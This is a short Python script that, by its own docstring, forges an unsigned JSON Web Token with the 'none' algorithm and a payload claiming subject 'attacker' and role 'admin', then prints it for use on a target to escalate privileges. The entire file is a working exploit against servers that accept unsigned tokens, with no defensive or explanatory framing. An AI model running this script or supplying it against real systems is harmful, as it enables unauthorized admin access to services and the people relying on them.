#!/usr/bin/env python3
"""Forge a JWT with alg=none to escalate role to admin.

Usage:
    python3 forge_jwt.py
Prints the token to stdout; export it to $ADMIN_JWT on the target.
"""
import base64
import json


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def main() -> None:
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "attacker", "role": "admin"}
    h = b64url(json.dumps(header).encode())
    p = b64url(json.dumps(payload).encode())
    print(f"{h}.{p}.")


if __name__ == "__main__":
    main()
